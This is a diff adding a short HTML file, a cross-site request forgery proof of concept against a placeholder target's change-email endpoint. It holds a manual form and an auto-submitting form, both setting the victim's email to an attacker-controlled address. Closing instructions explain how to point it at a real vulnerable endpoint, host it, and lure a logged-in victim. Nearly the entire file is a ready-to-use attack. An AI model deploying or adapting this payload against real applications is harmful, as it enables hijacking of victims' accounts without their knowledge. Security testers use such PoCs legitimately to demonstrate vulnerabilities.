@@ -1,0 +1,42 @@
+<html>
+  <head>
+    <title>CSRF Proof of Concept</title>
+  </head>
+  <body>
+    <h1>CSRF Attack PoC: Change Victim's Email</h1>
+    <p>If you are logged into the target application, submitting this form will change the email address on your account.</p>
+
+    <h2>Option 1: Manual Submit</h2>
+    <form id="csrfForm" action="https://TARGET-APPLICATION.COM/endpoint/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@controlled.com" />
+      <input type="submit" value="Click Me (Submit Form)" />
+    </form>
+
+    <br /><hr /><br />
+
+    <h2>Option 2: Auto-Submit</h2>
+    <p>This form will submit automatically when the page loads.</p>
+    <form id="csrfAutoForm" action="https://TARGET-APPLICATION.COM/endpoint/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@controlled.com" />
+      <noscript>
+        <input type="submit" value="JavaScript is disabled. Please click here to submit." />
+      </noscript>
+    </form>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById("csrfAutoForm").submit();
+      });
+    </script>
+
+    <hr />
+    <h3>Instructions:</h3>
+    <ol>
+      <li>Replace TARGET-APPLICATION.COM with the actual vulnerable endpoint.</li>
+      <li>Modify the hidden input fields to match the parameters of the target request.</li>
+      <li>Host this HTML file on a server you control.</li>
+      <li>Ensure the victim is logged into the target application.</li>
+      <li>When the victim visits your page, the request will be sent using their session.</li>
+    </ol>
+  </body>
+</html>
